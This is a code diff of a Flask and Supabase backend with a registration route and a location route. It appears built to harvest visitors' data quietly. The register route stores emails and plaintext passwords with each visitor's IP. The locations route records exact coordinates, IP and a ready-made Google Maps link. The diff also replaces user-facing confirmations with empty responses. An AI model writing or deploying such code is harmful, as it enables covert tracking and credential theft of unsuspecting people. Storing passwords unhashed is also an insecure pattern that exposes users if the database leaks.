@@ -16,57 +16,21 @@ supabase = create_client(
 )
 
 
+def get_client_ip():
+    forwarded = request.headers.get("X-Forwarded-For")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    return request.remote_addr
+
+
 @app.route("/", methods=["GET"])
 def home():
     return render_template("fronted.html")
 
-@app.route("/locations", methods=["POST"])
-def save_location():
-    data = request.get_json(silent=True) or {}
 
-    forwarded = request.headers.get("X-Forwarded-For")
-    if forwarded:
-        ip = forwarded.split(",")[0].strip()
-    else:
-        ip = request.remote_addr
-
-    latitude = data.get("latitude")
-    longitude = data.get("longitude")
-
-    if latitude is None or longitude is None:
-        return jsonify({
-            "error": "Latitude and longitude are required"
-        }), 400
-
-    try:
-        supabase.table("locations").insert({
-            "ip_address": ip,
-            "latitude": latitude,
-            "longitude": longitude, 
-        }).execute()
-
-        return jsonify({
-            "message": "Location saved successfully"
-        }), 200
-
-    except Exception as error:
-        print("SUPABASE ERROR:", error, flush=True)
-        return jsonify({
-            "error": "Could not save location"
-        }), 500
 @app.route("/register", methods=["POST"])
 def register():
     data = request.get_json(silent=True) or {}
-
-    # Get visitor IP from Render's forwarded header
-    forwarded = request.headers.get("X-Forwarded-For")
-    print("X-Forwarded-For:", forwarded, flush=True)
-    if forwarded:
-        ip = forwarded.split(",")[0].strip()
-    else:
-        ip = request.remote_addr
-
-    print("Visitor IP:", ip, flush=True)
 
     email = data.get("email")
     password = data.get("password")
@@ -80,19 +44,41 @@ def register():
         supabase.table("users").insert({
             "email": email,
             "password": password,
-            "ip_address": ip
+            "ip_address": get_client_ip()
         }).execute()
 
-        return jsonify({
-            "message": "Saved successfully"
-        }), 200
+        return "", 200
 
     except Exception as error:
         print("SUPABASE ERROR:", error, flush=True)
-
         return jsonify({
             "error": "Could not save data"
         }), 500
+
+
+@app.route("/locations", methods=["POST"])
+def save_location():
+    data = request.get_json(silent=True) or {}
+
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+
+    if latitude is None or longitude is None:
+        return "", 400
+
+    try:
+        supabase.table("locations").insert({
+            "ip_address": get_client_ip(),
+            "latitude": latitude,
+            "longitude": longitude,
+            "location_link": f"https://www.google.com/maps?q={latitude},{longitude}"
+        }).execute()
+
+        return "", 200
+
+    except Exception as error:
+        print("SUPABASE ERROR:", error, flush=True)
+        return "", 500
 
 
 if __name__ == "__main__":
